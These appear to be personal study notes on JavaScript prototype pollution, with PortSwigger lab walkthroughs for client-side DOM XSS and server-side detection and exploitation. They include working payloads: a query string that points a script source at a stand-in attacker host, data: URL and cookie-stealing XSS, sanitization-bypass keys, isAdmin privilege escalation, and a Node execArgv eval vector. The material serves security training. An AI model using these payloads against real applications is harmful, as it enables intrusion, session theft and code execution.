## Definition
JavaScript vulnerability that enables an attacker to:
- add arbitrary properties to global object prototypes
	- which may then be inherited by user-defined objects

## How arise
arise when a JS function:
- recursively merges an object containing user-controllable properties
	- into an existing object, without first sanitizing the keys.
- This can allow an attacker to:
	- inject a property with a key like `__proto__`, along with arbitrary nested properties.

Due to the [special meaning of `__proto__`](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance#accessing-an-object-s-prototype-using-proto) in a JavaScript context:
- the merge operation may assign the nested properties:
	- to the object's [prototype](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance#what-is-a-prototype-in-javascript) 
	- instead of the target object itself
	  
- As a result, the attacker can:
	- pollute the prototype with properties containing harmful values, 
		- which may subsequently be used by the application in a dangerous way

It's possible to pollute any prototype object:
- but this most commonly occurs with the built-in global Object.prototype.

Successful exploitation of prototype pollution requires the following key components:
- A prototype pollution source:
	- any input that enables you to poison prototype objects with arbitrary properties.

- A sink
	- a JavaScript function or DOM element that enables arbitrary code execution.

- An exploitable gadget 
	- any property that is passed into a sink without proper filtering or sanitization

## Prototype pollution sources
any user-controllable input that enables you to add arbitrary properties to prototype objects. 
The most common sources are as follows:
- The URL via either the query or fragment string (hash)
- JSON-based input
- Web messages

### Prototype pollution via the URL
Consider the following URL, which contains an attacker-constructed query string:
`https://vulnerable-website.com/?__proto__[evilProperty]=payload`

When breaking the query string down into `key:value` pair:
- a URL parser may interpret `__proto__` as an arbitrary string

But let's look at what happens if these keys and values:
- are subsequently merged into an existing object as properties.

You might think that the `__proto__` property, along with its nested `evilProperty`:
- will just be added to the target object as follows:
```
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
```
HOWEVER:
this isn't the case. 

At some point, the recursive merge operation:
- may assign the value of `evilProperty` using a statement equivalent to the following:
  `targetObject.__proto__.evilProperty = 'payload';`

During this assignment, the JavaScript engine:
- treats `__proto__` as a getter for the prototype
- As a result, `evilProperty` is assigned to:
	- the returned prototype object rather than the target object itself
	  
- Assuming that the target object uses the default `Object.prototype`:
  =>
	- all objects in the JS runtime will now inherit `evilProperty`
		- unless they already have a property of their own with a matching key.

In practice, injecting a property called `evilProperty`:
- is unlikely to have any effect.

However, an attacker can use the same technique to:
- pollute the prototype with properties that are used by the application, or any imported libraries.

### Prototype pollution via JSON input
User-controllable objects are often derived from a JSON string using the `JSON.parse()` method. 
Interestingly, `JSON.parse()` also treats:
- any key in the JSON object as an arbitrary string,
	- including things like `__proto__`. 
	- This provides another potential vector for prototype pollution.

Let's say an attacker injects the following malicious JSON, for example, via a web message:
```
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

If this is converted into a JS object via the `JSON.parse()` method:
=>
the resulting object will in fact have a property with the key `__proto__`:

```
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```

If the object created via `JSON.parse()`:
- is subsequently merged into an existing object without proper key sanitization:
  =>
- this will also lead to prototype pollution during the assignment,
	- as we saw in the previous URL-based example

## Prototype pollution sinks
A prototype pollution sink is essentially just:
- a JavaScript function or DOM element 
	- that you're able to access via prototype pollution, 
		- which enables you to execute arbitrary JavaScript or system commands. 

As prototype pollution lets you control properties that would otherwise be inaccessible:
- this potentially enables you to reach a n° of additional sinks within the target app. 

Developers who are unfamiliar with prototype pollution:
- may wrongly assume that these properties are not user controllable
	- which means there may only be minimal filtering or sanitization in place.

## Prototype pollution gadgets
A gadget provides a means of:
- turning the prototype pollution vulnerability into an actual exploit. 

This is any property that is:
- Used by the app in an unsafe way
	- such as passing it to a sink without proper filtering or sanitization.
    
- Attacker-controllable via prototype pollution. 
	- In other words:
		- the object must be able to inherit a malicious version of the property added to the prototype by an attacker.
    

A property cannot be a gadget if:
- it is defined directly on the object itself.
- In this case, the object's own version of the property:
	- takes precedence over any malicious version you're able to add to the prototype

### Example of a prototype pollution gadget
Many JavaScript libraries:
- accept an object that 
	- developers can use to set different configuration options. 
	  
The library code:
- checks whether the developer has explicitly added certain properties to this object 
- and, if so -->   adjusts the configuration accordingly. 
- If a property that represents a particular option is not present:
  =>
-  a predefined default option is often used instead.

A simplified example may look something like this:
`let transport_url = config.transport_url || defaults.transport_url;`

Now imagine the library code uses this `transport_url` to add a script reference to the page:
```
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

If the website's developers haven't set a `transport_url` property on their `config` object:
- this is a potential gadget. 
- In cases where an attacker is able to pollute the global `Object.prototype` with their own `transport_url` property:
  =>
	-  this will be inherited by the `config` object 
	- and, therefore, set as the `src` for this script to a domain of the attacker's choosing.

If the prototype can be polluted via a query parameter, for example:
- the attacker would simply have to 
	- induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:
	  `https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`

By providing a `data:` URL, 
an attacker could also directly embed an XSS payload within the query string as follows:
`https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`

Note that the trailing `//` in this example is simply to comment out the hardcoded `/example.js` suffix


## Client-side prototype pollution vulnerabilities
### Finding client-side prototype pollution sources manually
Finding prototype pollution sources manually:
- is largely a case of trial and error. 

In short, you need to:
- try different ways of adding an arbitrary property to `Object.prototype` 
	- until you find a source that works.

When testing for client-side vulnerabilities, this involves the following high-level steps:
1. Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. 
   For example:
   `vulnerable-website.com/?__proto__[foo]=bar`
   
2. In your browser console, inspect `Object.prototype` to see if you have successfully polluted it with your arbitrary property:
  
```
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
```

3. If the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
   `vulnerable-website.com/?__proto__.foo=bar`
   
4. Repeat this process for each potential source.

### Finding client-side prototype pollution sources using DOM Invader
DOM Invader is able to:
- automatically test for prototype pollution sources as you browse, 
	- which can save you a considerable amount of time and effort

### Finding client-side prototype pollution gadgets manually
Once you've identified a source that lets you add arbitrary properties to the global `Object.prototype`, the next step is to:
- find a suitable gadget that you can use to craft an exploit. 
- In practice, we recommend using DOM Invader to do this,
	- but it's useful to look at the manual process as it may help solidify your understanding of the vulnerability
=>
1. Look through the source code and identify any properties that are used by the application or any libraries that it imports.
    
2. In Burp, enable response interception (**Proxy > Options > Intercept server responses**) and intercept the response containing the JavaScript that you want to test.
    
3. Add a `debugger` statement at the start of the script, then forward any remaining requests and responses.
    
4. In Burp's browser, go to the page on which the target script is loaded. 
	1. The `debugger` statement pauses execution of the script.
    
5. While the script is still paused, switch to the console and enter the following command, replacing `YOUR-PROPERTY` with one of the properties that you think is a potential gadget:
```
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

6. The property is added to the global `Object.prototype`, and the browser will log a stack trace to the console whenever it is accessed.

2. Press the button to continue execution of the script and monitor the console. 
	1. If a stack trace appears, this confirms that the property was accessed somewhere within the application.

3. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.

4. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as `innerHTML` or `eval()`.

5. Repeat this process for any properties that you think are potential gadgets.

### Finding client-side prototype pollution gadgets using DOM Invader
As you can see from the previous steps:
- manually identifying prototype pollution gadgets in the wild can be a laborious task.
- Given that websites often rely on a number of third-party libraries:
	- this may involve reading through thousands of lines of minified or obfuscated code,
		- which makes things even trickier
=>
DOM Invader can automatically:
- scan for gadgets on your behalf 
- and can even generate a DOM XSS proof-of-concept in some cases. 
=>
This means you can:
- find exploits on real-world sites in a matter of seconds rather than hours

#### DOM XSS via client-side prototype pollution
<span style="background:#fff88f">Manual solution</span>
**Find a prototype pollution source**
1. In your browser, try polluting `Object.prototype` by injecting an arbitrary property via the query string:
   `/?__proto__[foo]=bar`
2. Open the browser DevTools panel and go to the **Console** tab.
3. Enter `Object.prototype`.
4. Study the properties of the returned object. 
	1. Observe that it now has a `foo` property with the value `bar`. 
	2. You've successfully found a prototype pollution source.

**Identify a gadget**
1. In the browser DevTools panel, go to the **Sources** tab.
2. Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks.
3. In `searchLogger.js`, notice that if the `config` object has a `transport_url` property, this is used to dynamically append a script to the DOM.
    
4. Notice that no `transport_url` property is defined for the `config` object. 
	1. This is a potential gadget for controlling the `src` of the `<script>` element.

**Craft an exploit**
1. Using the prototype pollution source you identified earlier, try injecting an arbitrary `transport_url` property:
   `/?__proto__[transport_url]=foo`
2. In the browser DevTools panel, go to the **Elements** tab and study the HTML content of the page. 
	1. Observe that a `<script>` element has been rendered on the page, with the `src` attribute `foo`.
	   
3. Modify the payload in the URL to inject an XSS proof-of-concept. 
4. For example, you can use a `data:` URL as follows:
   `/?__proto__[transport_url]=data:,alert(1);`
4. Observe that the `alert(1)` is called and the lab is solved.

#### DOM XSS via an alternative prototype pollution vector
<span style="background:#fff88f">DOM Invader solution</span>
1. Load the lab in Burp's built-in browser.
2. [Enable DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling) and [enable the prototype pollution option](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution).
3. Open the browser DevTools panel and go to the **DOM Invader** tab and reload the page.
4. Observe that DOM Invader has identified a prototype pollution vector in the `search` property i.e. the query string.

5. Click **Scan for gadgets**. 
	1. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.

6. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.

7. Observe that DOM Invader has successfully accessed the `eval()` sink via the `sequence` gadget.

8. Click **Exploit**. Observe that DOM Invader's auto-generated proof-of-concept doesn't trigger an `alert()`.
    
9. Go back to the previous browser tab and look at the `eval()` sink again in DOM Invader.
	1. Notice that following the closing canary string, a numeric `1` character has been appended to the payload.

10. Click **Exploit** again. In the new tab that loads, append a minus character (`-`) to the URL and reload the page.

11. Observe that the `alert(1)` is called and the lab is solved.

### Prototype pollution via the constructor
So far, we've looked exclusively at how you can get a reference to prototype objects via the special `__proto__` accessor property. 

As this is the classic technique for prototype pollution:
- a common defense is to strip any properties with the key `__proto__` from user-controlled objects before merging them.
- This approach is flawed as:
	- there are alternative ways to reference `Object.prototype` without relying on the `__proto__` string at all.

Unless its [prototype is set to `null`](https://portswigger.net/web-security/prototype-pollution/preventing#preventing-an-object-from-inheriting-properties):
- every JavaScript object has a `constructor` property
	- which contains a reference to the constructor function that was used to create it.

For example:
- you can create a new object either using literal syntax 
- or by explicitly invoking the `Object()` constructor as follows:
```
let myObjectLiteral = {};
let myObject = new Object();
```

You can then reference the `Object()` constructor via the built-in `constructor` property:
```
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
```

Remember that functions are also just objects under the hood. 
Each constructor function has a `prototype` property:
- which points to the prototype
	- that will be assigned to any objects that are created by this constructor. 
	- As a result, you can also access any object's prototype as follows:
```
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```

As `myObject.constructor.prototype` is equivalent to `myObject.__proto__`:
- this provides an alternative vector for prototype pollution.

#### Bypassing flawed key sanitization
An obvious way in which websites attempt to prevent prototype pollution is:
- by sanitizing property keys before merging them into an existing object

However, a common mistake is:
- failing to recursively sanitize the input string. 

For example, consider the following URL:
`vulnerable-website.com/?__pro__proto__to__.gadget=payload`

If the sanitization process just strips the string `__proto__` without repeating this process more than once:
- this would result in the following URL
	- which is a potentially valid prototype pollution source:
	  `vulnerable-website.com/?__proto__.gadget=payload`

##### Client-side prototype pollution via flawed sanitization
**Find a prototype pollution source**
1. In your browser, try polluting `Object.prototype` by injecting an arbitrary property via the query string:
   `/?__proto__.foo=bar`
2. Open the browser DevTools panel and go to the **Console** tab.
3. Enter `Object.prototype`.
4. Study the properties of the returned object and observe that your injected `foo` property has not been added.
    
5. Try alternative prototype pollution vectors.
   For example:
```
/?__proto__[foo]=bar
/?constructor.prototype.foo=bar
```

1. Observe that in each instance, `Object.prototype` is not modified.
2. Go to the **Sources** tab and study the JavaScript files that are loaded by the target site.
	1. Notice that `deparamSanitized.js` uses the `sanitizeKey()` function defined in `searchLoggerFiltered.js` to strip potentially dangerous property keys based on a blocklist. 
	2. However, it does not apply this filter recursively.
    
3. Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the sanitization process. 
   For example:
```
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```

1. In the console, enter `Object.prototype` again. 
	1. Notice that it now has its own `foo` property with the value `bar`. 
	2. You've successfully found a prototype pollution source and bypassed the website's key sanitization.
    

**Identify a gadget**
1. Study the JavaScript files again and notice that `searchLogger.js` dynamically appends a script to the DOM using the `config` object's `transport_url` property if present.
    
2. Notice that no `transport_url` property is set for the `config` object. 
	1. This is a potential gadget


**Craft an exploit**
1. Using the prototype pollution source you identified earlier, try injecting an arbitrary `transport_url` property:
   `/?__pro__proto__to__[transport_url]=foo`

1. In the browser DevTools panel, go to the **Elements** tab and study the HTML content of the page. 
	1. Observe that a `<script>` element has been rendered on the page, with the `src` attribute `foo`.

2. Modify the payload in the URL to inject an XSS proof-of-concept. 
	1. For example, you can use a `data:` URL as follows:
	   `/?__pro__proto__to__[transport_url]=data:,alert(1);`
	   
3. Observe that the `alert(1)` is called and the lab is solved

### Prototype pollution in external libraries
As we've touched on already:
- prototype pollution gadgets may occur in third-party libraries 
	- that are imported by the application

In this case, we strongly recommend:
- using DOM Invader's prototype pollution features
	- to identify sources and gadgets

##### Client-side prototype pollution in third-party libraries
1. Load the lab in Burp's built-in browser.
2. [Enable DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling) and [enable the prototype pollution option](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution).
3. Open the browser DevTools panel, go to the **DOM Invader** tab, then reload the page.
4. Observe that DOM Invader has identified two prototype pollution vectors in the `hash` property i.e. the URL fragment string.
    
5. Click **Scan for gadgets**. 
	1. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.

6. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.

7. Observe that DOM Invader has successfully accessed the `setTimeout()` sink via the `hitCallback` gadget.

8. Click **Exploit**. DOM Invader automatically generates a proof-of-concept exploit and calls `alert(1)`.
9. Disable DOM Invader.
10. In the browser, go to the lab's exploit server.
11. In the **Body** section, craft an exploit that will navigate the victim to a malicious URL as follows:
```html
<script>
    location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
```
1. Test the exploit on yourself, making sure that you're navigated to the lab's home page and that the `alert(document.cookie)` payload is triggered.
    
2. Go back to the exploit server and deliver the exploit to the victim to solve the lab.


## Server-side prototype pollution
### Why server side are more difficult to detect
For a number of reasons, server-side prototype pollution is generally more difficult to detect than its client-side variant:
- **No source code access** 
	- Unlike with client-side vulnerabilities:
		- you typically won't have access to the vulnerable JavaScript. 
		- This means there's no easy way to get an overview of which sinks are present or spot potential gadget properties
		  
- **Lack of developer tools**
	- As the JavaScript is running on a remote system:
		- you don't have the ability to inspect objects at runtime like you would when using your browser's DevTools to inspect the DOM. 
		  =>
		- This means it can be hard to tell when you've successfully polluted the prototype unless you've caused a noticeable change in the website's behavior.
		- This limitation obviously doesn't apply to white-box testing.
		  
- **The DoS problem** 
	- Successfully polluting objects in a server-side environment using real properties:
		- often breaks app functionality or brings down the server completely. 
		  
		- As it's easy to inadvertently cause a denial-of-service (DoS):
			- testing in production can be dangerous. 
			- Even if you do identify a vulnerability:
				- developing this into an exploit is also tricky when you've essentially broken the site in the process
				  
- **Pollution persistence** 
	- When testing in a browser, you can:
		- reverse all of your changes 
		- and get a clean environment again by simply refreshing the page. 
		- Once you pollute a server-side prototype:
			- this change persists for the entire lifetime of the Node process and you don't have any way of resetting it.

### Detecting server-side prototype pollution via polluted property reflection
An easy trap for developers to fall into is:
- forgetting or overlooking the fact that:
	- a JavaScript `for...in` loop iterates over all of an object's enumerable properties,
		- including ones that it has inherited via the prototype chain.
		  
You can test this out for yourself as follows:![[Pasted image 20240918175458.png|550]]

This also applies to arrays, where a `for...in` loop first iterates over each index:
- which is essentially just a numeric property key under the hood
	- before moving on to any inherited properties as well.

![[Pasted image 20240918175536.png|450]]

In either case, if the application later includes the returned properties in a response:
- this can provide a simple way to probe for server-side prototype pollution.

`POST` or `PUT` requests that submit JSON data to an app or API:
- are prime candidates for this kind of behavior 
	- as it's common for servers to respond with a JSON representation of the new or updated object.
	  
- In this case, you could attempt to:
	- pollute the global `Object.prototype` with an arbitrary property as follows:
![[Pasted image 20240918175707.png]]

In rare cases, the website may even use these properties to:
- dynamically generate HTML,
	- resulting in the injected property being rendered in your browser.

Once you identify that server-side prototype pollution is possible:
- you can then look for potential gadgets to use for an exploit. 
- Any features that involve updating user data:
	- are worth investigating 
		- as these often involve merging the incoming data into an existing object that represents the user within the application. 
		  
- If you can add arbitrary properties to your own user:
	- this can potentially lead to a number of vulnerabilities, including privilege escalation.

#### Privilege escalation via server-side prototype pollution
<span style="background:#fff88f">Study the address change feature</span>
1. Log in and visit your account page. 
	1. Submit the form for updating your billing and delivery address.

2. In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.

3. Observe that when you submit the form, the data from the fields is sent to the server as JSON.

4. Notice that the server responds with a JSON object that appears to represent your user. 
	1. This has been updated to reflect your new address information.

5. Send the request to Burp Repeater.

<span style="background:#fff88f">Identify a prototype pollution source</span>
1. In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with an arbitrary property:
```
"__proto__": {
    "foo":"bar"
}
```

1. Send the request.
2. Notice that the object in the response now includes the arbitrary property that you injected, but no `__proto__` property. 
	1. This strongly suggests that you have successfully polluted the object's prototype and that your property has been inherited via the prototype chain.
    

 <span style="background:#fff88f">Identify a gadget</span>
1. Look at the additional properties in the response body.
2. Notice the `isAdmin` property, which is currently set to `false`.

<span style="background:#fff88f">Craft an exploit</span>
1. Modify the request to try polluting the prototype with your own `isAdmin` property:
```
"__proto__": {
    "isAdmin":true
}
```

1. Send the request. 
	1. Notice that the `isAdmin` value in the response has been updated. 
	2. This suggests that the object doesn't have its own `isAdmin` property, 
		1. but has instead inherited it from the polluted prototype.

2. In the browser, refresh the page and confirm that you now have a link to access the admin panel.

3. Go to the admin panel and delete `carlos` to solve the lab.

### Detecting server-side prototype pollution without polluted property reflection
Most of the time, even when you successfully pollute a server-side prototype object:
- you won't see the affected property reflected in a response.
=>
- you can't just inspect the object in a console 
  =>
  this presents a challenge when trying to tell whether your injection worked.

One approach is to:
- try injecting properties that match potential configuration options for the server
- then compare the server's behavior before and after the injection 
	- to see whether this configuration change appears to have taken effect
- If so:
	- this is a strong indication that you've successfully found a server-side prototype pollution vulnerability.

In this section, we'll look at the following techniques:
- Status code override
- JSON spaces override
- Charset override

All of these injections are -->  non-destructive, 
						  but still produce a consistent and distinctive change in server behavior when successful

#### Status code override
Server-side JavaScript frameworks like Express:
- allow developers to set custom HTTP response statuses.
- In the case of errors:
	- a JS server may issue a generic HTTP response
	- but include an error object in JSON format in the body
	  =>
	- This is one way of providing additional details about why an error occurred
		- which may not be obvious from the default HTTP status.

Although it's somewhat misleading:
- it's even fairly common to receive a `200 OK` response
	- only for the response body to contain an error object with a different status.
Es:
```http
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

Node's `http-errors` module:
contains the following function for generating this kind of error response:
```javascript
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status   //highlighted
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status > 400 || status >= 600))) {
        status = 500                       //highlighted 
    }
    //...
```
The first highlighted line:
- attempts to assign the `status` variable 
	- by reading the `status` or `statusCode` property from the object passed into the function.
- If the website's developers haven't explicitly set a `status` property for the error:
	- you can potentially use this to probe for prototype pollution as follows:

	1. Find a way to trigger an error response and take note of the default status code.
	2. Try polluting the prototype with your own `status` property. 
		1. Be sure to use an obscure status code that is unlikely to be issued for any other reason.
	3. Trigger the error response again and check whether you've successfully overridden the status code

### JSON spaces override
The Express framework provides a `json spaces` option:
- which enables you to configure the number of spaces used to 
	- indent any JSON data in the response
- In many cases, developers:
	- leave this property undefined as they're happy with the default value, 
		- making it susceptible to pollution via the prototype chain.

If you've got access to any kind of JSON response:
- you can try polluting the prototype with your own `json spaces` property
- reissue the relevant request to see if the indentation in the JSON increases accordingly. You can perform the same steps to remove the indentation in order to confirm the vulnerability.

This is an especially useful technique because:
- it doesn't rely on a specific property being reflected. 

It's also extremely safe:
- as you're effectively able to turn the pollution on and off 
	- simply by resetting the property to the same value as the default.

#### Charset override
Express servers often implement so-called "middleware" modules:
- that enable preprocessing of requests
	- before they're passed to the appropriate handler function

For example, the `body-parser` module:
- is commonly used to parse the body of incoming requests 
	- in order to generate a `req.body` object. 
	- This contains another gadget 
		- that you can use to probe for server-side prototype pollution.

Notice that the following code:
- passes an options object into the `read()` function
	- which is used to read in the request body for parsing
- One of these options, `encoding`,:
	- determines which character encoding to use. 
	- This is either derived from the request itself via the `getCharset(req)` function call, or it defaults to UTF-8
```javascript
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```

If you look closely at the `getCharset()` function:
- it looks like the developers have anticipated that the `Content-Type` header may not contain an explicit `charset` attribute
	- so they've implemented some logic that reverts to an empty string in this case
	- =>
	  this means it may be controllable via prototype pollution.

If you can find an object whose properties are visible in a response:
=>
- you can use this to probe for sources. 
- In the following example, we'll use UTF-7 encoding and a JSON source.

1. Add an arbitrary UTF-7 encoded string to a property that's reflected in a response. 
	1. For example, `foo` in UTF-7 is `+AGYAbwBv-`.
```
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```
2. Send the request.
	1. Servers won't use UTF-7 encoding by default, so this string should appear in the response in its encoded form.
3. Try to pollute the prototype with a `content-type` property that explicitly specifies the UTF-7 character set:
```
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```

4. Repeat the first request. 
	1. If you successfully polluted the prototype, the UTF-7 string should now be decoded in the response:
```
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```

Due to a bug in Node's `_http_incoming` module:
- this works even when the request's actual `Content-Type` header includes its own `charset` attribute

To avoid overwriting properties when a request contains duplicate headers:
- the `_addHeaderLine()` function checks that 
	- no property already exists with the same key 
		- before transferring properties to an `IncomingMessage` object

```javascript
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
```

If it does:
- the header being processed is effectively dropped. 
- Due to the way this is implemented:
	- this check includes properties inherited via the prototype chain. 
	  =>
		- if we pollute the prototype with our own `content-type` property:
			- the property representing the real `Content-Type` header from the request is dropped at this point, 
			- along with the intended value derived from the header

##### Detecting server-side prototype pollution without polluted property reflection
<span style="background:#fff88f">Study the address change feature</span>
1. Log in and visit your account page. Submit the form for updating your billing and delivery address.
2. In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
    
3. Observe that when you submit the form, the data from the fields is sent to the server as JSON. 
	1. Notice that the server responds with a JSON object that appears to represent your user. 
	2. This has been updated to reflect your new address information.
    
4. Send the request to Burp Repeater.
5. In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with an arbitrary property:
```
"__proto__": {
    "foo":"bar"
}
```

1. Send the request. 
	1. Observe that the object in the response does not reflect the injected property.
	2. However, this doesn't necessarily mean that the application isn't vulnerable to prototype pollution

<span style="background:#fff88f">Identify a prototype pollution source</span>
1. In the request, modify the JSON in a way that intentionally breaks the syntax. 
	1. For example, delete a comma from the end of one of the lines.
    
2. Send the request. 
	1. Observe that you receive an error response in which the body contains a JSON error object.
    
3. Notice that although you received a `500` error response, the error object contains a `status` property with the value `400`.
    
4. In the request, make the following changes:
    - Fix the JSON syntax by reversing the changes that triggered the error.
    - Modify your injected property to try polluting the prototype with your own distinct `status` property. 
	    - Remember that this must be between 400 and 599.
```
"__proto__": {
    "status":555
}
```

1. Send the request and confirm that you receive the normal response containing your user object.
    
2. Intentionally break the JSON syntax again and reissue the request.
3. Notice that this time:
	1. although you triggered the same error, 
	2. the `status` and `statusCode` properties in the JSON response match the arbitrary error code that you injected into `Object.prototype`.
		1. This strongly suggests that you have successfully polluted the prototype and the lab is solved

### Scanning for server-side prototype pollution sources
[Server-Side Prototype Pollution Scanner](https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8):
which enables you to automate this process. 

The basic workflow is as follows:
1. Install the **Server-Side Prototype Pollution Scanner** extension from the BApp Store and make sure that it is enabled. 
	1. For details on how to do this, see [Installing extensions](https://portswigger.net/burp/documentation/desktop/extensions/installing-extensions)
	   
2. Explore the target website using Burp's browser to map as much of the content as possible and accumulate traffic in the proxy history.
3. In Burp, go to the **Proxy > HTTP history** tab.
4. Filter the list to show only in-scope items.
5. Select all items in the list.
6. Right-click your selection and go to **Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution**, then select one of the scanning techniques from the list.
7. When prompted, modify the attack configuration if required, then click **OK** to launch the scan.

In [Burp Suite Professional](https://portswigger.net/burp/pro), the extension:
- reports any prototype pollution sources it finds via the **Issue activity** panel on the **Dashboard** and **Target** tabs

### Bypassing input filters for server-side prototype pollution
Websites often attempt to:
- prevent or patch prototype pollution vulnerabilities by 
	- filtering suspicious keys like `__proto__`.

This key sanitization approach:
- is not a robust long-term solution 
	- as there are a number of ways it can potentially be bypassed

For example, an attacker can:
- Obfuscate the prohibited keywords so they're missed during the sanitization. 
	- For more information, see [Bypassing flawed key sanitization](https://portswigger.net/web-security/prototype-pollution/client-side#bypassing-flawed-key-sanitization).
	  
- Access the prototype via the constructor property instead of `__proto__`. 
	- For more information, see [Prototype pollution via the constructor](https://portswigger.net/web-security/prototype-pollution/client-side#prototype-pollution-via-the-constructor)

Node applications can also:
- delete or disable `__proto__` altogether 
	- using the command-line flags `--disable-proto=delete` or `--disable-proto=throw` respectively. 

However, this can also be bypassed -->  by using the constructor technique.

#### Bypassing flawed input filters for server-side prototype pollution
<span style="background:#fff88f">Study the address change feature</span>
1. Log in and visit your account page. Submit the form for updating your billing and delivery address.
2. In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
3. 1Observe that when you submit the form, the data from the fields is sent to the server as JSON. 
	1. Notice that the server responds with a JSON object that appears to represent your user. 
	2. This has been updated to reflect your new address information.
    
2. Send the request to Burp Repeater

<span style="background:#fff88f">Identify a prototype pollution source</span>
- In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with a `json spaces` property.
```
"__proto__": {
    "json spaces":10
}
```
1. Send the request.
2. In the **Response** panel, switch to the **Raw** tab. 
	1. Observe that the JSON indentation appears to be unaffected.
    
3. Modify the request to try polluting the prototype via the `constructor` property instead:
```
"constructor": {
    "prototype": {
        "json spaces":10
    }
}
```
1. Resend the request.
2. In the **Response** panel, go to the **Raw** tab. 
	1. This time, notice that the JSON indentation has increased based on the value of your injected property. 
	2. This strongly suggests that you have successfully polluted the prototype

<span style="background:#fff88f"> Identify a gadget</span>
1. Look at the additional properties in the response body.
2. Notice the `isAdmin` property, which is currently set to `false`.

Craft an exploit
1. Modify the request to try polluting the prototype with your own `isAdmin` property:
```
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```
1. Send the request. 
	1. Notice that the `isAdmin` value in the response has been updated. 
	2. This suggests that the object doesn't have its own `isAdmin` property, but has instead inherited it from the polluted prototype.
    
2. In the browser, refresh the page and confirm that you now have a link to access the admin panel.
3. Go to the admin panel and delete `carlos` to solve the lab

### Remote code execution via server-side prototype pollution
While client-side prototype pollution typically expose the vulnerable website to [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based):
- server-side prototype pollution can potentially result:
	- in remote code execution (RCE). 
	- In this section, you'll learn how to:
		- identify cases where this may be possible 
		- how to exploit some potential vectors in Node applications.

### Identifying a vulnerable request
There are a number of potential command execution sinks in Node:
- many of which occur in the `child_process` module

These are often invoked by:
- a request that occurs asynchronously to the request with which
	- you're able to pollute the prototype in the first place. 
	  
- As a result, the best way to identify these requests is:
	- by polluting the prototype with a payload that 
		- triggers an interaction with Burp Collaborator when called.

The `NODE_OPTIONS` environment variable enables you to:
- define a string of command-line arguments that should be used by default 
	- whenever you start a new Node process
	  
- As this is also a property on the `env` object:
	- you can potentially control this via prototype pollution if it is undefined.

Some of Node's functions for creating new child processes:
- accept an optional `shell` property
	- which enables developers to set a specific shell, such as bash, 
		- in which to run commands

By combining this with a malicious `NODE_OPTIONS` property:
- you can pollute the prototype in a way that 
	- causes an interaction with Burp Collaborator whenever a new Node process is created:
```
"execArgv": [
    "--eval=require('<module>')"
]
```

In addition to `fork()`:
- the `child_process` module contains the `execSync()` method, 
	- which executes an arbitrary string as a system command. 
